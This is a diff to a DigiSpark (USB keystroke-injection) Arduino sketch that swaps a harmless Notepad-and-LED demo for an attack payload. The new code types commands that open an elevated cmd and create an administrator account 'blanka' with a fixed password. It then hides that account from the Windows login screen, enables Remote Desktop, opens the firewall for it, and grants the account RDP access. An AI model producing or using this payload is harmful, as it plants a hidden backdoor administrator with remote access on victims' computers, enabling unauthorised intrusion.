@@ -14,30 +14,45 @@ void setup() {
 
 void loop() {
   //Small delay to make sure DigiSpark is fully connected
-  digitalWrite(1, HIGH);
-  DigiKeyboard.delay(100);
+  DigiKeyboard.update();
   DigiKeyboard.sendKeyStroke(0);
-  //Opens up Notepad
-  DigiKeyboard.sendKeyStroke('r',MOD_GUI_LEFT);
-  DigiKeyboard.delay(800);
-  DigiKeyboard.print("Notepad");
-  DigiKeyboard.delay(600);
+  DigiKeyboard.delay(3000);
+  
+  //Runs task manager
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+  DigiKeyboard.delay(200);
+  DigiKeyboard.println("taskmgr");
+  DigiKeyboard.delay(500);
+  DigiKeyboard.sendKeyStroke(KEY_F, MOD_ALT_LEFT); 
+  DigiKeyboard.sendKeyStroke(KEY_N);
+  DigiKeyboard.delay(500);
+  //Opens CMD
+  DigiKeyboard.print("cmd /k mode con: cols=15 lines=1");
+  DigiKeyboard.sendKeyStroke(KEY_TAB); 
+  //Turns on Admin Access
+  DigiKeyboard.sendKeyStroke(KEY_SPACE);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  DigiKeyboard.delay(600);
-  //Flashes LED when done
-  digitalWrite(1,LOW);
+  DigiKeyboard.delay(200);
+  //Closes Task Manager
+  DigiKeyboard.println("taskkill /IM \"taskmgr.exe\" /F ");
+  DigiKeyboard.delay(500);  
+  //Creates new account and gives it Admin Access
+  DigiKeyboard.println("net user blanka Ping@123 /ADD");
   DigiKeyboard.delay(500);
-  digitalWrite(1,HIGH);
+  DigiKeyboard.println("net localgroup Administrators blanka /ADD");
   DigiKeyboard.delay(500);
-  digitalWrite(1,LOW);
+  //Hides account from login screen
+  DigiKeyboard.println(F("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v blanka /t REG_DWORD /d 0 /f"));
   DigiKeyboard.delay(500);
-  digitalWrite(1,HIGH);
+  //Turns on Remote Desktop for the account
+  DigiKeyboard.println(F("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"));
   DigiKeyboard.delay(500);
-  digitalWrite(1,LOW);
+  DigiKeyboard.println(F("netsh advfirewall firewall set rule group=\"remote desktop\" new enable=yes"));
   DigiKeyboard.delay(500);
-  digitalWrite(1,HIGH);
-  DigiKeyboard.delay(500);
-  digitalWrite(1,LOW);
+  DigiKeyboard.println("net localgroup \"Remote Desktop Users\" blanka /add");
+  DigiKeyboard.delay(500);  
+  DigiKeyboard.println("exit");
+
   //DigiSpark disconnects
   for(;;){ /*empty*/ }
 }
